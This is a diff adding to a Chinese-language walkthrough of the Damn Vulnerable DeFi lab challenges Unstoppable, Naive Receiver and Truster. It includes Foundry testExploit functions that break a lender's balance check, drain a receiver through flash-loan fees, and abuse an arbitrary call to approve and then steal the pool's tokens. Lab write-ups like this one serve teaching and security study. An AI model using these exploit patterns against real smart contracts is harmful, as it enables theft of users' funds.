@@ -35,7 +35,18 @@ assert(poolBalance == balanceBefore);
 
 
 
-使用 foundry 编写测试::
+使用 foundry 编写测试:
+
+```solidity
+    function testExploit() public {
+        vm.startPrank(attacker);
+        dvt.transfer(address(unstoppableLender), 100e18);
+        vm.stopPrank();   
+        verify();
+    }
+```
+
+
 
 [Unstoppable.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/30349eba073206fe6b1c9acd26930468e543e064/src/test/Unstoppable.t.sol#L59-L64)
 
@@ -108,8 +119,80 @@ uint256 private constant FIXED_FEE = 1 ether;
 
 [NaiveReceiver.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/30349eba073206fe6b1c9acd26930468e543e064/src/test/NaiveReceiver.t.sol#L48-L55)
 
+```solidity
+    function testExploit() public {
+        vm.startPrank(attacker);
+        while (address(flashLoanReceiver).balance != 0){
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver),1 ether);
+        }
+        vm.stopPrank();
+        verify();
+    }
+```
+
+
+
 ```
 forge test --match-contract NaiveReceiver -vvvv
 ```
 
 ![NaiveReceiver](./testimage/NaiveReceiver.png)
+
+# #3 - Truster
+
+合约:
+
+- [DamnValuableToken](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/DamnValuableToken.sol)  Token 合约
+- [TrusterLenderPool](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/main/src/truster/TrusterLenderPool.sol) 借贷池合约
+
+完成条件:
+
+`TrusterLenderPool`借贷池有 100 万个 DVT 代币提供免费闪电贷,而你一无所有,你需要通过一笔交易取出借贷池里的所有代币.
+
+解决方案:
+
+直接看 `TrusterLenderPool` 的 **flashLoan** 函数,参数 target,和 data 传入可以直接让 `TrusterLenderPool`合约去call()调用任意合约的任意函数(永远不要相信用户的输入),**flashLoan** 函数最后面 **require()** 是保证闪电贷结束的额度得和调用前不变,所以不能在在 **target.functionCall(data)** 调用 dvt 代币合约的 **transfer()**直接将池里的代币发送给我们,而是先通过approve()将代币授权给我们,等闪电贷结束后再调用 dvt 代币合约 **transfer()** 将所有代币发送给我们
+```solidity
+    function flashLoan(
+        uint256 borrowAmount,
+        address borrower,
+        address target,
+        bytes calldata data
+    )
+        external
+        nonReentrant
+    {
+        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
+        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
+        
+        damnValuableToken.transfer(borrower, borrowAmount);
+        target.functionCall(data);
+
+        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
+        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
+    }
+```
+
+
+
+使用 foundry 编写测试:
+[Truster.t.sol](https://github.com/Poor4ever/damn-vulnerable-defi-solution/blob/30349eba073206fe6b1c9acd26930468e543e064/src/test/Truster.t.sol#L35-L42)
+
+```solidity
+    function testExploit() public {
+        vm.startPrank(attacker);
+        bytes memory approve_func_sign = abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), address(attacker), type(uint256).max);
+        trusterLenderPool.flashLoan(0, address(attacker), address(dvt), approve_func_sign);
+        dvt.transferFrom(address(trusterLenderPool), address(attacker), TOKENS_IN_POOL);
+        vm.stopPrank();
+        verfiy();
+    }
+```
+
+
+
+```
+forge test --match-contract Truster -vvvv
+```
+
+![Truster](./testimage/Truster.png)
